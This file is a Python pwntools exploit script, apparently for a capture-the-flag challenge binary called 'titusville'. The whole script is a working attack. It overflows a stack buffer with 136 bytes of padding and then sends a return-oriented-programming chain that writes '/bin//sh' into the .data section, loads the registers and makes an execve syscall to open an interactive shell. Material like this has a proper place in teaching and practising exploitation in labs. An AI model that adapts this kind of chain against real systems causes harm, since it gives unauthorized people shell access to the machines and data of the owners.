from pwn import *

binary_name="titusville"
# Padding goes here

p = process(f"./{binary_name}")
payload =  136 *b"A"

payload += p64(0x0000000000409f6e) # pop rsi ; ret
payload += p64(0x00000000004c50e0) # @ .data
payload += p64(0x0000000000448127) # pop rax ; ret
payload += b'/bin//sh'
payload += p64(0x000000000044a5a5) # mov qword ptr [rsi], rax ; ret
payload += p64(0x0000000000409f6e) # pop rsi ; ret
payload += p64(0x00000000004c50e8) # @ .data + 8
payload += p64(0x000000000043d310) # xor rax, rax ; ret
payload += p64(0x000000000044a5a5) # mov qword ptr [rsi], rax ; ret
payload += p64(0x0000000000401eff) # pop rdi ; ret
payload += p64(0x00000000004c50e0) # @ .data
payload += p64(0x0000000000409f6e) # pop rsi ; ret
payload += p64(0x00000000004c50e8) # @ .data + 8
payload += p64(0x000000000047f2ab) # pop rdx ; pop rbx ; ret
payload += p64(0x00000000004c50e8) # @ .data + 8
payload += p64(0x4141414141414141) # padding
payload += p64(0x000000000043d310) # xor rax, rax ; ret
payload += p64(0x0000000000448127) # pop rax, 0x3b ; ret
payload+=p64(0x3b)
payload += p64(0x0000000000401cb4) # syscall


p.sendline(payload)
p.interactive()
